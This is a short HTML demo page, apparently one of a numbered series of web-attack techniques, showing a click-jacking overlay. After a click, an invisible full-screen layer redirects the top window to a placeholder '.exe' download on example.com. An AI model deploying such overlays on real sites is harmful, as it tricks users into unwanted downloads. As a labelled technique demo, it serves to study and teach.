<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Tech 7 – Click‑jacking overlay</title>
<style>
  body{font-family:system-ui,sans-serif;margin:40px auto;max-width:400px;text-align:center;position:relative;}
  button{width:100%;padding:12px;background:#0056b3;color:#fff;border:none;border-radius:4px;cursor:pointer;}
  .overlay{
    position:fixed; inset:0; background:rgba(0,0,0,0.0); cursor:pointer;
    z-index:9999;
  }
</style>
</head>
<body>
<h2>Tech 7 – Click‑jacking overlay</h2>
<button onclick="run()">Original button</button>
<pre id="out" style="margin-top:10px;"></pre>
<script>
function run(){
  const overlay = document.createElement('div');
  overlay.className = 'overlay';
  overlay.onclick = () => window.top.location.href = 'https://example.com/download.exe';
  document.body.appendChild(overlay);
  setTimeout(() => document.body.removeChild(overlay), 150);
  document.getElementById('out').innerText = 'Overlay clicked – top window navigated to example.com';
}
</script>
</body>
</html>
